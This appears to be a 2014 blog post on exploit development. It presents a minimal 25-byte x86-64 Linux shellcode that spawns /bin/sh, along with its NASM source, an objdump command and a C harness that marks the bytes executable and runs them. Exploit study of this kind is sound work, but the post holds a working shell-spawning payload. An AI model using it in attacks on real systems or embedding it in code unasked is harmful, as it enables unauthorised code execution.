---
layout: post
title: "Minimal x86-64 shellcode for /bin/sh?"
date: 2014-06-05 01:54:22 +0000
permalink: /2014/06/05/minimal-x86-64-shellcode-for-binsh/
category: Security
tags: Exploitation,Security
---
I was trying to figure out the minimal shellcode necessary to launch /bin/sh from a 64-bit processor, and the smallest I could come up with is 25 bytes: `\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05`.

This was produced from the following source:

    BITS 64
    
    main:
      mov rbx, 0xFF978CD091969DD1
      neg rbx
      push rbx
      xor eax, eax
      cdq
      xor esi, esi
      push rsp
      pop rdi
      mov al, 0x3b  ; sys_execve
      syscall

Compile with nasm, examine the output with `objdump -M intel -b binary -m i386:x86-64 -D shellcode`.

Here's a program for testing:

    #include <sys/mman.h>
    #include <stdint.h>
    
    char code[] = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05";
    
    int main(){
      mprotect((void *)((uint64_t)code & ~4095), 4096, PROT_READ|PROT_EXEC);
      (*(void(*)()) code)();
      return 0;
    }

I'd like to find a good tool to compile my shellcode, extract as hex, build a test bin, and run it, all in one.  Should be a trivial python script, actually.
